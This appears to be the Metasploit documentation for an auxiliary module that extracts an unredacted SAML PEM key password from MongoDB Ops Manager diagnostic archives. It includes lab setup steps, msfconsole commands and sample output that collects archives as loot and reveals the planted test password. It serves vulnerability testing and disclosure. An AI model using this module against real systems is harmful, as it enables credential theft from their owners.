## Vulnerable Application

MongoDB Ops Manager Diagnostics Archive does not redact SAML SSL Pem Key File Password
field (`mms.saml.ssl.PEMKeyFilePassword`) within app settings. Archives do not include
the PEM files themselves. This module extracts that unredacted password and stores
the diagnostic archive for additional manual review.

This issue affects MongoDB Ops Manager v5.0 prior to 5.0.21 and
MongoDB Ops Manager v6.0 prior to 6.0.12.

API credentials with the role of `GLOBAL_MONITORING_ADMIN` or `GLOBAL_OWNER` are required.

Successfully tested against MongoDB Ops Manager v6.0.11.

### Install on Ubuntu 22.04

1. Download mongodb server deb from https://www.mongodb.com/download-center/community/releases/archive .
 Look for: `Server Package: mongodb-org-server_6.0.11_amd64.deb`
2. Download the 1.4gig ops manager (mms) deb from https://www.mongodb.com/subscription/downloads/archived
3. `sudo apt-get install snmp`
4. `sudo dpkg -i mongodb-org-server_6.0.11_amd64.deb`
5. `sudo dpkg -i mongodb-mms-*`
6. `sudo nano /opt/mongodb/mms/conf/conf-mms.properties` and add a new field at the bottom of the file: `mms.saml.ssl.PEMKeyFilePassword=FINDME`
7. `sudo systemctl start mongod.service`
8. `sudo systemctl start mongodb-mms.service` (wait a little while for it to initialize and run)
9. Browse to http://<ip>>:8080/account/register and perform the install, the SMTP fields can use values for a server which doesn't exist.
10. Top left corner of the page after install should be "Project 0", click the drop down and create new project. Any name is fine, I called it 'test'
11. Top right of the screen, click Admin, API Keys, Create API Key. Create a new key, for permissions select
`Global Monitoring Admin` or `Global Owner` (or both).

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/gather/mongodb_ops_manager_diagnostic_archive_info`
1. Do: `set API_PUBKEY [API_PUBKEY]`
1. Do: `set API_PRIVKEY [API_PRIVKEY]`
1. Do: `run`
1. You should find similar output to the following: `Found ubuntu22-0-bgrid's unredacted mms.saml.ssl.PEMKeyFilePassword: FINDME`

## Options

### API_PUBKEY

Public Key for the API key that was created with `Global Monitoring Admin` or `Global Owner` permissions.

### API_PRIVKEY

Private Key for the API key that was created with `Global Monitoring Admin` or `Global Owner` permissions.

## Scenarios

### Mongodb OPS Manager 6.0.11 on Ubuntu 22.04

```
msf6 > use auxiliary/gather/mongodb_ops_manager_diagnostic_archive_info
msf6 auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > set API_PUBKEY zmdhriti
API_PUBKEY => zmdhriti
msf6 auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > set API_PRIVKEY fd2faf05-18bc-4e6b-8ea1-419f3e8f95bc
API_PRIVKEY => fd2faf05-18bc-4e6b-8ea1-419f3e8f95bc
msf6 auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > set verbose true
verbose => true
msf6 auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) > run 
[*] Running module against 127.0.0.1

[*] Checking for orgs
[*] Looking for projects in org 65e86256961a9b1cc98c6c8b
[+]   Found project: Project 0 (65e86256961a9b1cc98c6c8f)
[+] Stored Project Diagnostics files to /root/.msf4/loot/20240307151114_default_127.0.0.1_mongodb.ops_mana_015137.gz
[*]     Opening project_diagnostics.tar.gz
[+] Found ubuntu22-0-bgrid's unredacted mms.saml.ssl.PEMKeyFilePassword: FINDME
[+] Found ubuntu22-0-mms's unredacted mms.saml.ssl.PEMKeyFilePassword: FINDME
[+]   Found project: test (65e86331961a9b1cc98c6db7)
[+] Stored Project Diagnostics files to /root/.msf4/loot/20240307151114_default_127.0.0.1_mongodb.ops_mana_205173.gz
[*]     Opening project_diagnostics.tar.gz
[+] Found ubuntu22-0-bgrid's unredacted mms.saml.ssl.PEMKeyFilePassword: FINDME
[+] Found ubuntu22-0-mms's unredacted mms.saml.ssl.PEMKeyFilePassword: FINDME
[*] Auxiliary module execution completed
msf6 auxiliary(gather/mongodb_ops_manager_diagnostic_archive_info) >
```
